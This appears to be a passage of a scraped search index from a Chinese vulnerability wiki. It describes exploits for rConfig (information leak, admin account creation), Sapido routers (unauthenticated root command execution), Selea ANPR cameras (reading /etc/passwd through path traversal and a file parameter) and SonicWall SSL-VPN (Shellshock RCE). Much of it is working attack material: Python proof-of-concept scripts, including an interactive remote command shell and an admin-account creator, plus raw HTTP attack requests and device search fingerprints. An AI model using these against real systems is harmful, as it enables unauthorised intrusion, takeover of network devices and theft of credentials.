'\u003ctr class=\"row' . ($i++ % 2) . '\"\u003e'; ?\u003e \u003ctd align=\"center\"\u003e\u003cinput type=\"checkbox\" name=\"tablecheckbox\" id=\"\u003c?php echo $id; ?\u003e\"/\u003e\u003c/td\u003e \u003ctd align=\"center\"\u003e\u003cstrong\u003e\u003c?php echo $rows['username'] ?\u003e\u003c/strong\u003e\u003c/td\u003e \u003ctd align=\"center\"\u003e\u003c?php echo $rows['email'] ?\u003e\u003c/td\u003e \u003ctd align=\"center\"\u003e \u003c?php // quick check if userlevel =9 user is admin else, user is a User if ($rows['userlevel'] == 9) { $userlevel = \"Admin\"; } else { $userlevel = \"User\"; } echo $userlevel; ?\u003e\u003c/td\u003e \u003ctd align=\"center\"\u003e \u003c?php // quick convert unix TimeStamp to normal times $lastLogin = date('H:i d-m-Y', $rows['timestamp']); echo $lastLogin; ?\u003e \u003c/td\u003e \u003c/tr\u003e \u003c?php endforeach; ?\u003e \u003c/tbody\u003e \u003c/table\u003e \u003c?php echo $pages-\u003edisplay_pages(); echo \"\u003cdiv class=\\\"spacer\\\"\u003e\u003c/div\u003e\"; echo \"\u003cp class=\\\"paginate\\\"\u003ePage: $pages-\u003ecurrent_page of $pages-\u003enum_pages\u003c/p\u003e\\n\"; 文件没有设定权限，任何人可以访问泄露信息 漏洞验证的Url为 /useradmin.inc.php 泄露用户信息 ","date":"0001-01-01","objectID":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"rConfig userprocess.php 任意用户创建漏洞 ","date":"0001-01-01","objectID":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 rConfig userprocess.php 存在任意用户创建漏洞，发送特定的请求包攻击者可以创建管理员账户登录后台 ","date":"0001-01-01","objectID":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 rConfig ","date":"0001-01-01","objectID":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"rConfig\" ","date":"0001-01-01","objectID":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件为 userproce.php \u003c?php /** * Process.php * * The Process class is meant to simplify the task of processing * user submitted forms, redirecting the user to the correct * pages if errors are found, or if form is successful, either * way. Also handles the logout procedure. * * Written by: Jpmaster77 a.k.a. The Grandmaster of C++ (GMC) * Last Updated: August 19, 2004 */ include(\"/home/rconfig/classes/usersession.class.php\"); class Process { /* Class constructor */ function Process() { global $session; /* User submitted login form */ if (isset($_POST['sublogin'])) { $this-\u003eprocLogin(); } /* Admin submitted user add form */ else if (isset($_POST['add']) \u0026\u0026 isset($_POST['editid']) \u0026\u0026 empty($_POST['editid'])) { $this-\u003eprocRegister(); } /* Admin submitted user edit form */ else if (isset($_POST['add']) \u0026\u0026 isset($_POST['editid']) \u0026\u0026 !empty($_POST['editid'])) { $this-\u003eprocUpdateAccount(); } /* User submitted forgot password form */ else if (isset($_POST['subforgot'])) { $this-\u003eprocForgotPass(); } /* User submitted edit account form */ else if (isset($_POST['subedit'])) { $this-\u003eprocEditAccount(); } /** * The only other reason user should be directed here * is if he wants to logout, which means user is * logged in currently. */ else if ($session-\u003elogged_in) { $this-\u003eprocLogout(); } /** * Should not get here, which means user is viewing this page * by mistake and therefore is redirected. */ else { header(\"Location: /login.php\"); } } /** * procLogin - Processes the user submitted login form, if errors * are found, the user is redirected to correct the information, * if not, the user is effectively logged in to the system. */ function procLogin() { global $session, $form; /* Login attempt */ $retval = $session-\u003elogin($_POST['user'], $_POST['pass'], isset($_POST['remember'])); /* Login successful */ if ($retval) { header(\"Location: \" . $session-\u003ereferrer); } /* Login failed */ else { $_SESSION['value_array'] = $_POST; $_SESSION['error_array'] = $form-\u003egetErrorArray(); header(\"Location: \" . $session-\u003ereferrer); } } /** * procLogout - Simply attempts to log the user out of the system * given that there is no logout form to process. */ function procLogout() { global $session; $retval = $session-\u003elogout(); header(\"Location: /login.php\"); } /** * procRegister - Processes the user submitted registration form, * if errors are found, the user is redirected to correct the * information, if not, the user is effectively registered with * the system and an email is (optionally) sent to the newly * created user. */ function procRegister() { global $session, $form; /* Convert username to all lowercase (by option) */ if (ALL_LOWERCASE) { $_POST['username'] = strtolower($_POST['username']); } /* Registration attempt */ $retval = $session-\u003eregister($_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Registration Successful */ if ($retval == 0) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session-\u003ereferrer); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form-\u003egetErrorArray(); header(\"Location: \" . $session-\u003ereferrer . \"?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session-\u003ereferrer); } } /** * procForgotPass - Validates the given username then if * everything is fine, a new password is generated and * emailed to the address the user gave on sign up. */ function procForgotPass() { global $database, $session, $mailer, $form; /* Username error checking */ $subuser = $_POST['user']; $field = \"user\"; //Use field name for userna","date":"0001-01-01","objectID":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: rConfig userprocess.php 任意用户创建漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'testtest{}'.format(ran_number), 'password': 'testtest@{}'.format(ran_number), 'passconf': 'testtest@{}'.format(ran_number), 'email': 'testtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'testtest{}'.format(ran_number)} print(\"\\033[36m[o] 正在创建账户..... \\033[0m\".format(ran_number, ran_number)) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: print(\"\\033[36m[o] 成功创建账户 testtest{}/testtest@{} \\033[0m\".format(ran_number, ran_number)) else: print(\"\\033[31m[x] 创建失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Sapido 多款路由器 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Sapido多款路由器在未授权的情况下，导致任意访问者可以以Root权限执行命令 ","date":"0001-01-01","objectID":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 BR270n-v2.1.03 BRC76n-v2.1.03 GR297-v2.1.3 RB1732-v2.0.43 ","date":"0001-01-01","objectID":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Sapido-路由器\" ","date":"0001-01-01","objectID":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 固件中存在一个asp文件为 syscmd.asp 存在命令执行 访问目标： http://xxx.xxx.xxx.xxx/syscmd.asp http://xxx.xxx.xxx.xxx/syscmd.htm 直接输入就可以命令执行了 ","date":"0001-01-01","objectID":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/sapido-%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Selea OCR-ANPR摄像机 get_file.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Selea OCR-ANPR摄像机 get_file.php存在 任意文件读取漏洞，通过构造特殊请求获取服务器文件 ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Selea Selea Targa IP OCR-ANPR Camera iZero Selea Selea Targa IP OCR-ANPR Camera Targa 512 Selea Selea Targa IP OCR-ANPR Camera Targa 504 Selea Selea Targa IP OCR-ANPR Camera Targa Semplice Selea Selea Targa IP OCR-ANPR Camera Targa 704 TKM Selea Selea Targa IP OCR-ANPR Camera Targa 805 Selea Selea Targa IP OCR-ANPR Camera Targa 710 INOX Selea Selea Targa IP OCR-ANPR Camera Targa 750 Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"selea_httpd\" ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送如下请求包 POST /cgi-bin/get_file.php HTTP/1.1 Host: Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: lang=en; PHPSESSID=bvib0lq6lahlhbjnfv91k13ou0 name=test\u0026files_list=/etc/passwd ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-get_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Selea OCR-ANPR摄像机 SeleaCamera 存在任意文件读取漏洞，攻击者通过构造特定的Url读取服务器的文件 ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Selea Selea Targa IP OCR-ANPR Camera iZero Selea Selea Targa IP OCR-ANPR Camera Targa 512 Selea Selea Targa IP OCR-ANPR Camera Targa 504 Selea Selea Targa IP OCR-ANPR Camera Targa Semplice Selea Selea Targa IP OCR-ANPR Camera Targa 704 TKM Selea Selea Targa IP OCR-ANPR Camera Targa 805 Selea Selea Targa IP OCR-ANPR Camera Targa 710 INOX Selea Selea Targa IP OCR-ANPR Camera Targa 750 Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"selea_httpd\" ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送如下请求包读取文件 GET /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1 Host: Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close 摄像头账号密码文件为 mnt/data/auth/users.json ","date":"0001-01-01","objectID":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/selea-ocr-anpr%E6%91%84%E5%83%8F%E6%9C%BA-seleacamera-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"SonicWall SSL-VPN 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞 ","date":"0001-01-01","objectID":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 SonicWall SSL-VPN ","date":"0001-01-01","objectID":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"SONICWALL-SSL-VPN\" ","date":"0001-01-01","objectID":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件为 /cgi-bin/jarrewrite.sh #!/bin/bash # jarrewrite.sh: # Script takes a jar/class file and a working directory; modifies class files # within the jar and repackages them. USAGE_STR=\"Usage: $0 \u003cjar/class file\u003e \u003cpath-to-working directory\u003e\" # Validate number of args if [ $# -ne 2 ]; then echo ${USAGE_STR}; exit -1; fi for param in $*; do if [ \"$param\" == \"-h\" ]; then echo ${USAGE_STR}; exit 1; fi done # constants BOUNDARY=\"-------------------------------------------------------------\" BASE_DIR=/tmp JAVA_SRC=$1 WDIR=$2 CWD=`pwd` FULL_JAVA_SRC_PATH=${BASE_DIR}/${WDIR}/${JAVA_SRC} CLASSES_DIR=classes META_INF_DIR=${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF MANIFEST=${META_INF_DIR}/MANIFEST.MF MANIFEST_DIGEST_FILE=${META_INF_DIR}/SWALL_SIGNATURE.SF SIGNATURE_FILE=${META_INF_DIR}/SWALL_SIGNATURE.DSA CODESIGNER_CRT=./../../var/cs_cert/httprpCodeSignerX509Crt.pem CODESIGNER_PVTKEY=./../../var/cs_cert/httprpCodeSignerPvtkey.pem DO_SIGN=0 if [ ! -f ${FULL_JAVA_SRC_PATH} ];then echo \"File not found: ${FULL_JAVA_SRC_PATH}\"; exit -2; fi if [ ${JAVA_SRC##*.} == \"jar\" ] # Using bracket in variable substitution. then # organize mkdir ${BASE_DIR}/$WDIR/$CLASSES_DIR # unzip jar unzip -d ${BASE_DIR}/${WDIR}/${CLASSES_DIR} ${FULL_JAVA_SRC_PATH}; # Simple sanity check to see if the JAR has already been signed. # FIXME: This is not a complete check,because the original JAR signature # has to be verified completely otherwise a malicious applet # could access the local resources with SSL VPN signing it. old_sf_files=`/bin/ls ${META_INF_DIR}/*.[sS][fF] ` old_sign_files=`/bin/ls ${META_INF_DIR}/*.[rRdD][sS][aA] ` for sf_file in $old_sf_files do for sign_file in $old_sign_files do DO_SIGN=1; break done; break; done # remove all manifest info including signatures # remove all that match mf|MF|sf|SF or dsa|DSA|rsa|RSA rm -f ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.[sSmM][fF] ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.?[sS][aA] OUTPUT_JAR=\"${FULL_JAVA_SRC_PATH}\" classfiles=`/usr/bin/find ${BASE_DIR}/${WDIR}/${CLASSES_DIR} -type f` #New Manifest file MANIFEST_MAIN_ATTR=\"Manifest-Version: 1.0\\nCreated-By: 1.0 (SonicWALL Inc.)\\n\" echo -e \"Creating Manifest file ... \" echo -e ${MANIFEST_MAIN_ATTR} \u003e ${MANIFEST} for file in $classfiles do echo $BOUNDARY echo $file echo $BOUNDARY ./jdasm $file $file #Update manifest file SHA1_MANIFEST_ENTRY_CLASS=`openssl dgst -sha1 -binary $file | openssl base64` MANIFEST_ENTRY=\"Name: ${file##${BASE_DIR}/${WDIR}/${CLASSES_DIR}/}\\nSHA1-Digest: ${SHA1_MANIFEST_ENTRY_CLASS}\\n\" echo -e ${MANIFEST_ENTRY} \u003e\u003e ${MANIFEST} echo $BOUNDARY done if [ ${DO_SIGN} == 1 ]; then echo -e \"Creating Manifest Signature file and Signature block\" \u003e\u003e $OUTLOG /usr/sbin/sw_jarsigner -m ${MANIFEST} -s ${MANIFEST_DIGEST_FILE} -S ${SIGNATURE_FILE} -c ${CODESIGNER_CRT} -k ${CODESIGNER_PVTKEY} fi rm -f ${FULL_JAVA_SRC_PATH} cd ${BASE_DIR}/${WDIR}/${CLASSES_DIR}; zip -r ${OUTPUT_JAR} * cd ${CWD} # clean rm -Rf ${BASE_DIR}/${WDIR}/${CLASSES_DIR} elif [ ${JAVA_SRC##*.} == \"class\" ]; then # if file is a class if [ ! -e ${FULL_JAVA_SRC_PATH} ];then echo \"File not found: ${FULL_JAVA_SRC_PATH}\"; exit -2; fi ./jdasm ${FULL_JAVA_SRC_PATH} ${FULL_JAVA_SRC_PATH}; fi echo \"Recursive Class Rewrite Completed.\" exit 0; 这个文件存在命令注入漏洞，漏洞触发在 Usage-Agent 发送如下请求即可命令执行 GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd' 发送请求会下载一个文件，文件内容为命令执行的结果 ","date":"0001-01-01","objectID":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/sonicwall-ssl-vpn-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: SonicWall SSL-VPN \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" % (cmd)} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/cgi-bin/jarrewrite.sh \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def 